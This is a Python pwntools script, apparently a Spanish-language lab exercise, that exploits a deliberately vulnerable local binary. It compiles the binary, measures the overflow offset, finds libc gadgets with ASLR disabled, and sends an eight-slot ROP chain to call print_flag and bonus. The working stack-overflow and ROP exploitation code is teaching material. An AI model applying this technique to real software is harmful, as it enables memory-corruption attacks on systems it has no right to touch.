#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""B4 - Cadena multi-gadget: pop rdi + pop rsi -> print_flag(0x1337,0x7331)
y luego bonus(), consumiendo la pila casilla a casilla.
FASE 1: offset ciclico. FASE 2: cadena completa de 8 casillas.
Los gadgets se buscan en libc (pop rdi/rsi) y en el binario (ret).
USO: python3 b4_cadena.py"""
from pwn import *
import os
import re
import subprocess

context.arch = 'amd64'
context.log_level = 'info'

BIN = './b4_cadena'
FLAG_B4 = b'FLAG{ROP_B4_cadena_multi_gadget}'
BONUS = b'[bonus] cadena completada'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'b4_cadena.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)
print_flag = elf.symbols['print_flag']
bonus = elf.symbols['bonus']
log.info('print_flag @ %#x | bonus @ %#x (ejemplo; las tuyas seran '
         'distintas)', print_flag, bonus)

# base de libc via ldd con ASLR fuera (mismo metodo que B2 y B3)
ARCH = os.uname().machine
ldd_out = subprocess.run(
    ['setarch', ARCH, '-R', 'ldd', BIN],
    capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x([0-9a-f]+)\)', ldd_out)
libc_path, libc_base = m.group(1), int(m.group(2), 16)
libc = ELF(libc_path, checksec=False)
libc.address = libc_base
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = ROP(libc).find_gadget(['pop rsi', 'ret'])[0]
log.info('libc base %#x | pop rdi; ret @ %#x | pop rsi; ret @ %#x',
         libc_base, pop_rdi, pop_rsi)

# gadget 'ret' suelto del binario: alineacion antes de CADA funcion
ret_gadget = ROP(elf).find_gadget(['ret'])[0]

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # misma via que ldd
io.recvuntil(b'y despues bonus()')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))   # x86_64: leer desde $rsp
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes', offset)

# ------------------------------------------------------------------
# FASE 2 - cadena de 8 casillas (como la Figura de la Parte 2):
#   [pop_rdi][0x1337][pop_rsi][0x7331][ret][print_flag][ret][bonus]
# Cada 'ret' de gadget o de funcion consume la casilla siguiente;
# los gadgets 'ret' sueltos mantienen la pila alineada a 16 bytes.
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # ASLR fuera, como el ldd
io.recvuntil(b'y despues bonus()')
payload = (b'A' * offset
           + p64(pop_rdi)     # casilla 1: gadget que carga RDI
           + p64(0x1337)      # casilla 2: valor para RDI (consumido por pop)
           + p64(pop_rsi)     # casilla 3: gadget que carga RSI
           + p64(0x7331)      # casilla 4: valor para RSI (consumido por pop)
           + p64(ret_gadget)  # casilla 5: alineacion para print_flag
           + p64(print_flag)  # casilla 6: su ret consumira la 7
           + p64(ret_gadget)  # casilla 7: alineacion para bonus
           + p64(bonus))      # casilla 8: remate de la cadena
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

if FLAG_B4 in salida and BONUS in salida:
    log.success('B4 SUPERADO: dos funciones seguidas con una sola '
                'entrada; la pila fue la "cola de instrucciones".')
elif FLAG_B4 in salida:
    log.failure('B4: flag OK pero bonus() no llego: revisa las casillas 7-8.')
else:
    log.failure('B4: sin flag. Pistas: pop rsi de libc y orden de casillas.')
